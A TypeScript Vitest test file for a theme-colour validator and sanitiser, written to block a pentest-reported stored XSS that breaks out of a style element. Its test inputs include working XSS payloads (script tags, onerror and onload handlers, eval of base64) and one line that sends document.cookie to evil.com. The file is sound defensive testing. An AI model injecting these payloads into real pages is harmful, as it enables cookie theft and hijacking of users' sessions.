import { describe, it, expect } from "vitest";
import {
  isValidThemeColor,
  safeThemeColor,
  DEFAULT_LANDING_THEME_COLOR,
} from "../landing-theme";

describe("isValidThemeColor", () => {
  describe("accepts valid hexadecimal colors", () => {
    const validColors = [
      "#fff",
      "#FFF",
      "#000",
      "#123",
      "#abc",
      "#ABC",
      "#1a5632",
      "#FFFFFF",
      "#000000",
      "#123456",
      "#abcdef",
      "#ABCDEF",
      "#1A5632",
    ];

    validColors.forEach((color) => {
      it(`accepts '${color}' as valid`, () => {
        expect(isValidThemeColor(color)).toBe(true);
      });
    });
  });

  describe("rejects invalid or malicious inputs", () => {
    const invalidInputs = [
      // XSS payloads - the core vulnerability
      "#123456</style><script>alert('XSS')</script><style>",
      "#fff</style><script>document.body.dataset.xss='1'</script><style>",
      "</style><img src=x onerror=alert(1)><style>",
      "#000</style><svg onload=alert(1)><style>",
      
      // Style element breakout attempts
      "</style>",
      "#abc</style>",
      "red</style><script>",
      
      // Invalid color formats
      "",
      "red",
      "rgb(255,0,0)",
      "rgba(255,0,0,0.5)",
      "hsl(0,100%,50%)",
      "#",
      "#12",
      "#1234",
      "#12345",
      "#1234567",
      "#gggggg",
      "#xyz",
      
      // Non-string types
      null,
      undefined,
      123,
      true,
      false,
      {},
      [],
      
      // Strings without hash prefix
      "ffffff",
      "123456",
      "fff",
      
      // Hash in wrong position
      "ff#fff",
      "ffffff#",
      
      // Multiple hashes
      "##fff",
      "#fff#",
      
      // Whitespace variations
      " #fff",
      "#fff ",
      " #ffffff ",
      "\n#fff",
      "#fff\n",
      
      // URL-encoded attempts
      "%23fff",
      "#fff%00",
      
      // Unicode/special characters
      "#\u0000fff",
      "#fff\u0000",
    ];

    invalidInputs.forEach((input) => {
      it(`rejects '${JSON.stringify(input)}' as invalid`, () => {
        expect(isValidThemeColor(input)).toBe(false);
      });
    });
  });

  describe("type guard behavior", () => {
    it("narrows type to string when true", () => {
      const value: unknown = "#fff";
      if (isValidThemeColor(value)) {
        // TypeScript should know value is string here
        const _typeCheck: string = value;
        expect(typeof value).toBe("string");
      }
    });
  });
});

describe("safeThemeColor", () => {
  describe("normalizes valid 3-digit hex colors to 6-digit lowercase", () => {
    const testCases = [
      { input: "#fff", expected: "#ffffff" },
      { input: "#FFF", expected: "#ffffff" },
      { input: "#000", expected: "#000000" },
      { input: "#123", expected: "#112233" },
      { input: "#abc", expected: "#aabbcc" },
      { input: "#ABC", expected: "#aabbcc" },
      { input: "#f0a", expected: "#ff00aa" },
    ];

    testCases.forEach(({ input, expected }) => {
      it(`normalizes '${input}' to '${expected}'`, () => {
        expect(safeThemeColor(input)).toBe(expected);
      });
    });
  });

  describe("normalizes valid 6-digit hex colors to lowercase", () => {
    const testCases = [
      { input: "#ffffff", expected: "#ffffff" },
      { input: "#FFFFFF", expected: "#ffffff" },
      { input: "#000000", expected: "#000000" },
      { input: "#123456", expected: "#123456" },
      { input: "#ABCDEF", expected: "#abcdef" },
      { input: "#1A5632", expected: "#1a5632" },
      { input: "#AbCdEf", expected: "#abcdef" },
    ];

    testCases.forEach(({ input, expected }) => {
      it(`normalizes '${input}' to '${expected}'`, () => {
        expect(safeThemeColor(input)).toBe(expected);
      });
    });
  });

  describe("returns default color for XSS payloads (security-critical)", () => {
    const xssPayloads = [
      // Direct XSS attempts from pentest
      "#123456</style><script>alert('XSS')</script><style>",
      "#fff</style><script>document.body.dataset.xss='1'</script><style>",
      
      // Style element breakout
      "</style><img src=x onerror=alert(1)><style>",
      "#000</style><svg onload=alert(1)><style>",
      
      // Various script injection attempts
      "</style><script>eval(atob('YWxlcnQoMSk='))</script><style>",
      "#abc</style><iframe src=javascript:alert(1)></iframe><style>",
      "</style><body onload=alert(1)><style>",
      
      // Event handler injections
      "</style><img src=x onerror=fetch('//evil.com?c='+document.cookie)><style>",
      "</style><svg/onload=alert(document.domain)><style>",
    ];

    xssPayloads.forEach((payload) => {
      it(`sanitizes XSS payload: ${payload.substring(0, 50)}...`, () => {
        const result = safeThemeColor(payload);
        expect(result).toBe(DEFAULT_LANDING_THEME_COLOR);
        // Verify result is safe for CSS interpolation
        expect(result).toMatch(/^#[0-9a-f]{6}$/);
        // Verify no HTML/script tags in result
        expect(result).not.toContain("<");
        expect(result).not.toContain(">");
        expect(result).not.toContain("script");
        expect(result).not.toContain("style");
      });
    });
  });

  describe("returns default color for invalid inputs", () => {
    const invalidInputs = [
      "",
      "red",
      "rgb(255,0,0)",
      "#",
      "#12",
      "#1234",
      "#12345",
      "#1234567",
      "#gggggg",
      null,
      undefined,
      123,
      true,
      {},
      [],
      "ffffff",
      " #fff",
      "#fff ",
    ];

    invalidInputs.forEach((input) => {
      it(`returns default for invalid input: ${JSON.stringify(input)}`, () => {
        expect(safeThemeColor(input)).toBe(DEFAULT_LANDING_THEME_COLOR);
      });
    });
  });

  describe("output is always safe for CSS interpolation", () => {
    const testInputs = [
      "#fff",
      "#123456",
      "#ABCDEF",
      "invalid",
      "</style><script>alert(1)</script><style>",
      null,
      undefined,
      "",
      "#gggggg",
    ];

    testInputs.forEach((input) => {
      it(`produces CSS-safe output for: ${JSON.stringify(input)}`, () => {
        const result = safeThemeColor(input);
        
        // Must match strict hex color format
        expect(result).toMatch(/^#[0-9a-f]{6}$/);
        
        // Must not contain any HTML/CSS breaking characters
        expect(result).not.toContain("<");
        expect(result).not.toContain(">");
        expect(result).not.toContain("\"");
        expect(result).not.toContain("'");
        expect(result).not.toContain("\\");
        expect(result).not.toContain("\n");
        expect(result).not.toContain("\r");
        expect(result).not.toContain(";");
        expect(result).not.toContain("}");
        expect(result).not.toContain("{");
        
        // Must be exactly 7 characters (#RRGGBB)
        expect(result.length).toBe(7);
        
        // Must start with hash
        expect(result[0]).toBe("#");
      });
    });
  });

  describe("pentest reproduction scenarios", () => {
    it("prevents stored XSS via style element breakout (Step 1 from pentest)", () => {
      // The exact payload from the pentest finding
      const maliciousThemeColor = "#123456</style><script>document.body.dataset.xss='1'</script><style>";
      
      const sanitized = safeThemeColor(maliciousThemeColor);
      
      // Should return safe default instead of malicious payload
      expect(sanitized).toBe(DEFAULT_LANDING_THEME_COLOR);
      expect(sanitized).toBe("#1a5632");
      
      // Verify the sanitized value cannot break out of style context
      const styleContent = `
        .landing-page-container {
          --theme: ${sanitized};
          --theme-bg-light: ${sanitized}0a;
        }
      `;
      
      // The style content should not contain any script tags
      expect(styleContent).not.toContain("<script>");
      expect(styleContent).not.toContain("</style>");
      expect(styleContent).not.toContain("dataset.xss");
    });

    it("prevents XSS when value is interpolated into dangerouslySetInnerHTML", () => {
      const attackPayload = "#fff</style><img src=x onerror=alert(1)><style>";
      
      const sanitized = safeThemeColor(attackPayload);
      
      // Simulate the actual rendering context from page.tsx line 41-46
      const htmlString = `
        .landing-page-container {
          --theme: ${sanitized};
          --theme-bg-light: ${sanitized}0a;
        }
      `;
      
      // Verify no executable markup in the output
      expect(htmlString).not.toContain("<img");
      expect(htmlString).not.toContain("onerror");
      expect(htmlString).not.toContain("alert");
      expect(htmlString).not.toContain("</style>");
      
      // Verify only safe color value is present
      expect(htmlString).toContain("#1a5632");
    });

    it("handles edge case of empty/null themeColor from database", () => {
      // When themeColor is null/undefined from database
      expect(safeThemeColor(null)).toBe(DEFAULT_LANDING_THEME_COLOR);
      expect(safeThemeColor(undefined)).toBe(DEFAULT_LANDING_THEME_COLOR);
      expect(safeThemeColor("")).toBe(DEFAULT_LANDING_THEME_COLOR);
    });
  });

  describe("integration with API validation", () => {
    it("validates colors that would pass API validation", () => {
      // These should pass isValidThemeColor in the API
      const validApiColors = ["#1a5632", "#fff", "#000000", "#ABCDEF"];
      
      validApiColors.forEach((color) => {
        expect(isValidThemeColor(color)).toBe(true);
        const safe = safeThemeColor(color);
        expect(safe).toMatch(/^#[0-9a-f]{6}$/);
      });
    });

    it("rejects colors that would fail API validation", () => {
      // These should fail isValidThemeColor in the API
      const invalidApiColors = [
        "#123456</style><script>alert(1)</script><style>",
        "red",
        "rgb(255,0,0)",
        "#gggggg",
      ];
      
      invalidApiColors.forEach((color) => {
        expect(isValidThemeColor(color)).toBe(false);
        // safeThemeColor provides defense in depth
        expect(safeThemeColor(color)).toBe(DEFAULT_LANDING_THEME_COLOR);
      });
    });
  });

  describe("defense in depth - double encoding attempts", () => {
    const encodingAttempts = [
      "%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
      "\\x3c\\x2fstyle\\x3e\\x3cscript\\x3e",
      "&#60;/style&#62;&#60;script&#62;",
      "&lt;/style&gt;&lt;script&gt;",
    ];

    encodingAttempts.forEach((attempt) => {
      it(`rejects encoded XSS attempt: ${attempt}`, () => {
        expect(isValidThemeColor(attempt)).toBe(false);
        expect(safeThemeColor(attempt)).toBe(DEFAULT_LANDING_THEME_COLOR);
      });
    });
  });
});

describe("DEFAULT_LANDING_THEME_COLOR", () => {
  it("is a valid hex color", () => {
    expect(isValidThemeColor(DEFAULT_LANDING_THEME_COLOR)).toBe(true);
  });

  it("is in normalized format", () => {
    expect(DEFAULT_LANDING_THEME_COLOR).toMatch(/^#[0-9a-f]{6}$/);
  });

  it("equals the expected default value", () => {
    expect(DEFAULT_LANDING_THEME_COLOR).toBe("#1a5632");
  });
});
